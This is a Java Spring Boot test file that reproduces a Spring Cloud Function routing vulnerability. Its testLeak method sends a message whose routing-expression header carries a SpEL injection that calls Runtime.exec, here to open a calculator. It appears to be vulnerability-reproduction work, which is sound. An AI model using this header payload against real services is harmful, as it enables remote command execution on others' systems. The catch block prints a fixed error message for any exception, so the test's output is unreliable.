import com.edu.nbu.fan.sample.SampleApplication;
import org.junit.Test;
import org.junit.jupiter.api.AfterEach;
import org.junit.runner.RunWith;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.cloud.function.context.FunctionCatalog;
import org.springframework.cloud.function.context.FunctionProperties;
import org.springframework.cloud.function.context.config.RoutingFunction;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.messaging.Message;
import org.springframework.messaging.support.MessageBuilder;
import org.springframework.test.context.junit4.SpringRunner;
import reactor.core.publisher.Flux;

import java.util.function.Function;

/**
 * @author laoshi . hua
 * @version 1.0 2022/3/29-3:18 PM
 * @since 1.0
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = SampleApplication.class)
public class SampleApplicationTest {

    private ConfigurableApplicationContext context;

    @AfterEach
    public void before() {
        System.clearProperty("spring.cloud.function.definition");
        System.clearProperty("spring.cloud.function.routing-expression");
        context.close();
    }


    private FunctionCatalog configureCatalog(Class<?> configurationClass) {
        context = new SpringApplicationBuilder(configurationClass).run(
                "--logging.level.org.springframework.cloud.function=DEBUG",
                "--spring.cloud.function.routing.enabled=true");
        return context.getBean(FunctionCatalog.class);
    }

    private FunctionCatalog configureCatalog() {
        return configureCatalog(RoutingFunctionConfiguration.class);
    }

    @Test
    public void testLeak(){
        FunctionCatalog functionCatalog = this.configureCatalog();
        Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);
        Message<String> message = MessageBuilder.withPayload("hello")
                .setHeader(FunctionProperties.PREFIX + ".routing-expression",
                        "T(java.lang.Runtime).getRuntime().exec(\"open -a calculator.app\")")
                .build();
        try {
            function.apply(message);
//            fail();
        }
        catch (Exception e) {
            System.out.println("EL1005E: Type cannot be found 'java.lang.Runtime'");
        }

    }

    @EnableAutoConfiguration
    @Configuration
    protected static class RoutingFunctionConfiguration {

        @Bean
        public Function<String, String> reverse() {
            return v -> new StringBuilder(v).reverse().toString();
        }

        @Bean
        public Function<String, String> uppercase() {
            return String::toUpperCase;
        }

        @Bean
        public Function<Flux<String>, Flux<String>> echoFlux() {
            return f -> f;
        }
    }
}
